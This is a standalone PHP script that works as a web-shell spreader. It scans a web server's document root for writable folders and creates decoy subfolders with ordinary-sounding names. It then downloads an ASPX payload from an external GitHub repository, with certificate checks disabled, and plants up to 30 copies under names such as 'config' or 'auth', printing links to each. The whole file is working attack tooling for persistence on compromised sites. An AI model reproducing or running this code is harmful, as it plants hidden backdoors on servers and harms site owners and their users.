<?php
set_time_limit(0);
error_reporting(E_ALL);
ini_set('display_errors', '1');

define('MAX_SPREAD', 30);
define('DEPLOY_PROBABILITY', 25);
define('LEVEL_PROBABILITY', 20);

$target_names = [
    'index','main','default','common','user','client','server','config','setting','setup',
    'init','start','connect','service','adminpanel','session','coredata','database','access','auth',
    'module','plugin','theme','mediafile','controller','router','loader','uploader','downloader','backupdata',
    'restorepoint','staticfile','publicdata','privatefile','account','userinfo','profile','security','log','history'
];

$folder_prefixes = [
    'assets','bin','cache','cdn','cloud','components','configurations','controllers','corelib','cronjobs',
    'databasefiles','datastore','defaultdata','distribution','documents','editor','environment','eventhandlers','extensions','frameworks'
];

$remote_urls = [
    'https://raw.githubusercontent.com/asepexploit/bc/refs/heads/main/manjiro.aspx'
];

function fetchPayload(string $url) {
    if (ini_get('allow_url_fopen')) {
        $data = @file_get_contents($url);
        if ($data !== false && trim($data) !== '') {
            return $data;
        }
    }
    if (function_exists('curl_version')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT         => 10,
        ]);
        $data = curl_exec($ch);
        curl_close($ch);
        if ($data !== false && trim($data) !== '') {
            return $data;
        }
    }
    return false;
}

function getWritableFolders($dir) {
    $res = [];
    $items = @scandir($dir);
    if (!$items) return $res;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($full)) {
            @chmod($full, 0755);
            if (is_writable($full)) {
                $res[] = $full;
                $res = array_merge($res, getWritableFolders($full));
            }
        }
    }
    return $res;
}

function randomSubfolder($base) {
    global $folder_prefixes;
    shuffle($folder_prefixes);
    $prefix = $folder_prefixes[0];
    $rand = rand(100, 999);
    $new = $base . '/' . $prefix . '-' . $rand;
    if (!is_dir($new)) {
        @mkdir($new, 0755, true);
    }
    return $new;
}

function chooseTargetFolder($start, $all) {
    $levels = [];
    $dir = $start;
    while (true) {
        $levels[] = $dir;
        $parent = dirname($dir);
        if ($parent === $dir) break;
        $dir = $parent;
    }
    foreach ($levels as $lvl) {
        if (mt_rand(1, 100) <= LEVEL_PROBABILITY && is_writable($lvl)) {
            return randomSubfolder($lvl);
        }
    }
    $base = $all[array_rand($all)];
    return randomSubfolder($base);
}

echo "<!-- Starting ASPX deployment -->\n";

$base_dir = rtrim($_SERVER['DOCUMENT_ROOT'], '/');
$all_folders = getWritableFolders($base_dir);
shuffle($all_folders);

$spread_count = 0;
foreach ($all_folders as $folder) {
    if ($spread_count >= MAX_SPREAD) break;
    if (mt_rand(1, 100) > DEPLOY_PROBABILITY) continue;
    $target_folder = chooseTargetFolder($folder, $all_folders);
    @chmod($target_folder, 0755);
    if (!is_writable($target_folder)) continue;

    shuffle($target_names);
    $name = $target_names[0];
    $full_path = $target_folder . '/' . $name . '.aspx';
    if (file_exists($full_path)) continue;

    shuffle($remote_urls);
    $payload = '';
    foreach ($remote_urls as $u) {
        $c = fetchPayload($u);
        if ($c !== false) {
            $payload = $c;
            break;
        }
    }
    if ($payload === '') continue;

    if (@file_put_contents($full_path, $payload) !== false) {
        $spread_count++;
        $rel = str_replace($base_dir, '', $full_path);
        $proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        $url = "{$proto}://{$_SERVER['HTTP_HOST']}" . str_replace(DIRECTORY_SEPARATOR, '/', $rel);
        echo "<a href=\"{$url}\" target=\"_blank\">{$url}</a><br>\n";
    }
}

echo "<!-- ASPX deployment complete: {$spread_count} files -->\n";
